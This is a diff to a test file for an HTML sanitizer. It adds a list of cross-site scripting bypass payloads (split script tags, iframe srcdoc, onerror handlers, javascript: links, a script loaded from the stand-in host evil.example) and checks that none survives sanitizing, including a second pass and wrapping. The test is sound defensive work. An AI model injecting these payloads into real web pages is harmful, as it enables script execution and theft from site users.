@@ -100,5 +100,32 @@ ok("isUnsafeDocHtml true for handler", isUnsafeDocHtml(dirty));
 ok("isUnsafeDocHtml false for clean", !isUnsafeDocHtml(rich));
 ok("empty/nullish safe", sanitizeDocHtml("") === "" && sanitizeDocHtml(null) === "" && sanitizeDocHtml(undefined) === "");
 
+// ── the security sweep (SI-1): nested and unclosed tags, an iframe's inline document ────────
+const live = (h: string) => /<\s*(script|iframe|object|embed|frame|base|meta|form)\b/i.test(h) || /\bsrcdoc\s*=/i.test(h) || /\bon[a-z]+\s*=/i.test(h.replace(/&[a-z]+;/g, ""));
+for (const payload of [
+  `<scr<script>ipt>alert(1)</scr<script>ipt>`,
+  `<ifr<script>ame srcdoc="&lt;script&gt;parent.x=1&lt;/script&gt;"></iframe>`,
+  `<ifr<scr<scr<script>ipt>ipt>ame style="display:none" srcdoc="&lt;script&gt;x()&lt;/script&gt;">`,
+  `<p>ok</p><iframe srcdoc="&lt;script&gt;x()&lt;/script&gt;"`,
+  `<p>ok</p><scr<script>ipt src=//evil.example/x.js></scr<script>ipt>`,
+  `<sc<style>x</style>ript>alert(1)</script>`,
+  `<im<script>g src=x onerror=alert(1)>`,
+  `<img src=x on<script>error=alert(1)>`,
+  `<a href="javas<script>cript:alert(1)">x</a>`,
+  `<div srcdoc="&lt;script&gt;x()&lt;/script&gt;">x</div>`,
+  `<button formaction="javascript:alert(1)">x</button>`,
+  `<object data="x"`,
+]) {
+  const once = sanitizeDocHtml(payload);
+  ok(`nothing live survives: ${payload.slice(0, 50)}`, !live(once) && !/javascript:/i.test(once), once);
+  ok(`…and sanitizing again changes nothing (a fixed point): ${payload.slice(0, 40)}`, sanitizeDocHtml(once) === once, sanitizeDocHtml(once));
+  // what the print shell does: wrap and close — an unclosed tag must not be closed into life
+  ok(`…nor once wrapped in the print shell: ${payload.slice(0, 40)}`, !live(`<div>${once}</div>`), once);
+}
+ok("a document's own formatting is kept as it was",
+  sanitizeDocHtml(`<!-- BODY --><h1 class="t">Заглавие</h1><p style="text-align:center">Текст <b>удебелен</b> <a href="https://ptsbg.eu">връзка</a></p><table><tr><td colspan="2">x</td></tr></table>`)
+    === `<!-- BODY --><h1 class="t">Заглавие</h1><p style="text-align:center">Текст <b>удебелен</b> <a href="https://ptsbg.eu">връзка</a></p><table><tr><td colspan="2">x</td></tr></table>`);
+ok("text that merely mentions a form or a script is not touched", sanitizeDocHtml(`<p>The script of the form: 5 &lt; 6</p>`) === `<p>The script of the form: 5 &lt; 6</p>`);
+
 console.log(`\nsanitize-html.test: ${pass} passed, ${fail} failed`);
 if (fail) process.exitCode = 1;
